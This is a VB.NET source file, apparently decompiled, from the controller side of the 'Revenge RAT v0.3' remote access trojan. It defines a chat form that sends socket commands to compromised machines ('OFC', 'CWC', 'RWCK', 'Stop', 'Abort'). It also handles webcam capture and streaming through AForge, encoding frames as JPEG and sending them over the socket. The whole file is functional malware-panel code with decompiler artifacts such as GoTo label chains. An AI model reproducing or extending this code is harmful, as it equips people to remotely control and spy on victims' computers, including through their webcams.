Imports AForge.Video
Imports AForge.Video.DirectShow
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class CH
    Public ADP As String
    Public ASS As String
    Public B As Integer
    Public ByTesS As Byte()
    Public CID As String
    Public CLDP As String
    Public ClientColorString As String
    Public ClinetColor As Color
    Public Devices As String
    Private Shared DispositivosDeVideo As FilterInfoCollection = New FilterInfoCollection(FilterCategory.VideoInputDevice)
    Public FT As String
    Public ID As String
    Public LastPicture As String
    Public LastTyping As Object
    Public MeColor As Color
    Public MeColorString As String
    Public Old As Image
    Public OLDStatus As String
    Public OS As Integer
    Public PP As PictureBox
    Public Q As Integer
    Public Sock As Integer
    Private FuenteDeVideo As VideoCaptureDevice
    Public Sub New()
        Me.FuenteDeVideo = Nothing
        Me.B = 0
        Me.PP = New PictureBox
        Me.InitializeComponent()
    End Sub
    Public Sub AT(ByVal C As Color, ByVal IDF As String, ByVal T As String)
        Dim num2 As Integer
        Try
            Dim num3 As Integer
Label_0001:
            ProjectData.ClearProjectError()
            Dim num As Integer = -2
Label_0009:
            num3 = 2
            Me.RCG.SelectionColor = C
Label_0019:
            num3 = 3
            Me.RCG.AppendText(String.Concat(New String() {"[ ", Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))), " ] - ", IDF, " : ", T, ChrW(13) & ChrW(10)}))
Label_007B:
            num3 = 4
            Me.RCG.ScrollToCaret()
            GoTo Label_00F9
Label_0092:
            num2 = 0
            Select Case (num2 + 1)
                Case 1
                    GoTo Label_0001
                Case 2
                    GoTo Label_0009
                Case 3
                    GoTo Label_0019
                Case 4
                    GoTo Label_007B
                Case 5
                    GoTo Label_00F9
                Case Else
                    GoTo Label_00EE
            End Select
Label_00B3:
            num2 = num3
            Select Case If((num > -2), num, 1)
                Case 0
                    GoTo Label_00EE
                Case 1
                    GoTo Label_0092
            End Select
        Catch obj1 As Exception
            GoTo Label_00B3
        End Try
Label_00EE:
        '   Throw ProjectData.CreateProjectError(-2146828237)
Label_00F9:
    End Sub

    Public Sub C(ByVal Device As Integer)
        Me.FuenteDeVideo = New VideoCaptureDevice(CH.DispositivosDeVideo.Item(Device).MonikerString)
        AddHandler Me.FuenteDeVideo.NewFrame, New NewFrameEventHandler(AddressOf Me.video)
        Me.FuenteDeVideo.Start()
        Me.Timer1.Enabled = True
    End Sub

    Private Sub CH_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Me.Terminar()
        My.Forms.Main.s.Send(Me.Sock, "Stop")
        My.Forms.Main.s.Send(Me.Sock, "Abort")
    End Sub

    Private Sub CH_Load(sender As Object, e As EventArgs) Handles Me.Load
        If (Me.CLDP <> Nothing) Then
            Try
                Me.PictureBox1.Image = New Bitmap(Image.FromStream(New MemoryStream(Convert.FromBase64String(Me.CLDP))))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError()
            End Try
        End If
        If (Me.ADP <> Nothing) Then
            Try
                Me.PictureBox2.Image = New Bitmap(Image.FromStream(New MemoryStream(Convert.FromBase64String(Me.ADP))))
            Catch exception2 As Exception
                ProjectData.SetProjectError(exception2)
                ProjectData.ClearProjectError()
            End Try
        End If
        My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"OFC", My.Forms.Main.Key, Me.MeColorString, My.Forms.Main.Key, Me.ClientColorString, My.Forms.Main.Key, Me.ID, My.Forms.Main.Key, Me.CID, My.Forms.Main.Key, Me.FT, My.Forms.Main.Key, Me.ASS}))
        Me.OLDStatus = Me.Label2.Text
        Me.Pic.Visible = False
        Me.TableLayoutPanel6.RowStyles.Item(1).SizeType = SizeType.Percent
        Me.TableLayoutPanel6.RowStyles.Item(0).SizeType = SizeType.AutoSize
    End Sub

    Private Sub INPTXT_KeyPress(sender As Object, e As KeyPressEventArgs) Handles INPTXT.KeyPress
        If ((Me.INPTXT.Text <> "") AndAlso (e.KeyChar = ChrW(13))) Then
            Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("ET" & My.Forms.Main.Key), SocketServer.Encode(Me.INPTXT.Text))}
            Dim copyBack As Boolean() = New Boolean() {True, False}
            NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
            End If
            Me.AT(Me.MeColor, Conversions.ToString(SocketServer.Decode(Me.ID)), Me.INPTXT.Text)
            Me.INPTXT.Text = ""
            My.Forms.Main.s.Send(Me.Sock, ("IsTyping" & My.Forms.Main.Key & Conversions.ToString(True)))
            Me.INPTXT.ScrollToCaret()
        End If
    End Sub

    Private Sub INPTXT_TextChanged(sender As Object, e As EventArgs) Handles INPTXT.TextChanged
        If (Me.INPTXT.Text <> Nothing) Then
            If Not Me.Timer3.Enabled Then
                Me.Timer3.Enabled = True
            End If
            My.Forms.Main.s.Send(Me.Sock, ("IsTyping" & My.Forms.Main.Key & Conversions.ToString(False)))
            Me.LastTyping = Me.INPTXT.Text
        Else
            Me.Label2.Text = Me.OLDStatus
        End If
    End Sub

    Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
        Dim imageEncoders As ImageCodecInfo() = ImageCodecInfo.GetImageEncoders
        Dim length As Integer = imageEncoders.Length
        Dim i As Integer = 0
        Do While (i <= length)
            If (imageEncoders(i).MimeType = M) Then
                Return imageEncoders(i)
            End If
            i += 1
        Loop
        Return Nothing
    End Function
    Public Shared Function md5(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim buffer As Byte() = B
        Dim num3 As Integer = (buffer.Length - 1)
        Dim i As Integer = 0
        Do While (i <= num3)
            str2 = (str2 & buffer(i).ToString("x2"))
            i += 1
        Loop
        Return str2
    End Function

    Private Sub PictureBox1_DoubleClick(sender As Object, e As EventArgs) Handles PictureBox1.DoubleClick
        If (Me.ToolStripButton10.Text <> "Stop video call") Then
            Dim cp As New CP
            cp.Sock = Me.Sock
            cp.OS = Me.OS
            cp.PP = False
            cp.ShowDialog
        End If
    End Sub

    Private Sub PictureBox2_DoubleClick(sender As Object, e As EventArgs) Handles PictureBox2.DoubleClick
        If (Me.ToolStripButton10.Text <> "Stop video call") Then
            Dim cp As New CP
            cp.Sock = Me.Sock
            cp.OS = Me.OS
            cp.PP = True
            cp.Name = ("CP" & Conversions.ToString(Me.OS))
            cp.ShowDialog
        End If
    End Sub
    Public Sub SK(ByVal DE As Integer)
        My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"CWC", My.Forms.Main.Key, Conversions.ToString(DE), My.Forms.Main.Key, Conversions.ToString(Me.Q)}))
    End Sub

    Public Sub Terminar()
        Try
            If ((Not Me.FuenteDeVideo Is Nothing) AndAlso Me.FuenteDeVideo.IsRunning) Then
                Me.FuenteDeVideo.SignalToStop()
                Me.FuenteDeVideo = Nothing
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
        Me.Timer1.Enabled = False
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            My.Forms.Main.s.Send(Me.Sock, ("RWCK" & My.Forms.Main.Key & Convert.ToBase64String(Me.ByTesS)))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        If Operators.ConditionalCompareObjectEqual(Me.INPTXT.Text, Me.LastTyping, False) Then
            My.Forms.Main.s.Send(Me.Sock, ("IsTyping" & My.Forms.Main.Key & Conversions.ToString(True)))
            Me.Timer3.Enabled = False
        End If
    End Sub

    Private Sub ToolStripButton10_Click(sender As Object, e As EventArgs) Handles ToolStripButton10.Click
        If (Me.ToolStripButton10.Text = "Start video call") Then
            Dim wcv As New WCV
            wcv.Name = ("WCV" & Conversions.ToString(Me.OS))
            wcv.Devices = Me.Devices
            wcv.OS = Me.OS
            wcv.ShowDialog
        Else
            Me.Timer1.Enabled = False
            Me.ToolStripButton10.Text = "Start video call"
            Me.ToolStripButton10.Image = My.Resources._1478078554_webcam_add
            Me.Pic.Visible = False
            Me.TableLayoutPanel6.RowStyles.Item(1).SizeType = SizeType.Percent
            Me.TableLayoutPanel6.RowStyles.Item(0).SizeType = SizeType.AutoSize
            Me.Terminar()
            My.Forms.Main.s.Send(Me.Sock, "Stop")
            Me.PictureBox2.Image = Me.Old
        End If
    End Sub

    Private Sub ToolStripButton4_Click(sender As Object, e As EventArgs) Handles ToolStripButton4.Click
        My.Forms.Main.s.Send(Me.Sock, "Ping")
        Me.AT(Color.Blue, Conversions.ToString(SocketServer.Decode(Me.ID)), "Buzz!!")
    End Sub

    Private Sub ToolStripButton5_Click(sender As Object, e As EventArgs) Handles ToolStripButton5.Click
        If (Me.ColorDialog1.ShowDialog = DialogResult.OK) Then
            Me.MeColorString = Me.ColorDialog1.Color.ToArgb.ToString
            Me.MeColor = Color.FromArgb(Conversions.ToInteger(Me.MeColorString))
            My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"Color", My.Forms.Main.Key, Me.MeColorString, My.Forms.Main.Key, Me.ClientColorString}))
        End If
    End Sub

    Private Sub ToolStripButton6_Click(sender As Object, e As EventArgs) Handles ToolStripButton6.Click
        If (Me.ColorDialog1.ShowDialog = DialogResult.OK) Then
            Me.ClientColorString = Me.ColorDialog1.Color.ToArgb.ToString
            Me.ClinetColor = Color.FromArgb(Conversions.ToInteger(Me.ClientColorString))
            My.Forms.Main.s.Send(Me.Sock, String.Concat(New String() {"Color", My.Forms.Main.Key, Me.MeColorString, My.Forms.Main.Key, Me.ClientColorString}))
        End If
    End Sub

    Private Sub ToolStripButton7_Click(sender As Object, e As EventArgs) Handles ToolStripButton7.Click
        Dim flag As Boolean = False
        If (Me.ToolStripButton7.ForeColor = Color.Blue) Then
            flag = False
            Me.ToolStripButton7.ForeColor = Color.Black
        Else
            flag = True
            Me.ToolStripButton7.ForeColor = Color.Blue
        End If
        My.Forms.Main.s.Send(Me.Sock, ("TOM" & My.Forms.Main.Key & Conversions.ToString(flag)))
    End Sub
    Public Sub video(ByVal sender As Object, ByVal eventArgs As NewFrameEventArgs)
        Try
            Dim bitmap As Bitmap = DirectCast(eventArgs.Frame.Clone, Bitmap)
            Me.PP.Image = bitmap
            Do While True
                Dim image As Bitmap = DirectCast(Me.PP.Image, Bitmap)
                Using New Bitmap(image)
                    Dim bitmap4 As New Bitmap(image)
                    Dim encoderParams As New EncoderParameters(1)
                    encoderParams.Param(0) = New EncoderParameter(Encoder.Quality, CLng(Me.Q))
                    Dim encoderInfo As ImageCodecInfo = CH.GetEncoderInfo("image/jpeg")
                    Dim stream2 As New MemoryStream
                    bitmap4.Save(stream2, encoderInfo, encoderParams)
                    bitmap4.Dispose()
                    Dim stream As New MemoryStream(stream2.ToArray)
                    Me.LastPicture = CH.md5(stream2.ToArray)
                    Dim box As PictureBox = Me.PictureBox2
                    SyncLock box
                        Me.PictureBox2.Image = image.FromStream(stream)
                    End SyncLock
                    Me.ByTesS = stream2.ToArray
                    image.Dispose()
                End Using
            Loop
        Catch exception1 As Exception
        End Try
    End Sub

End Class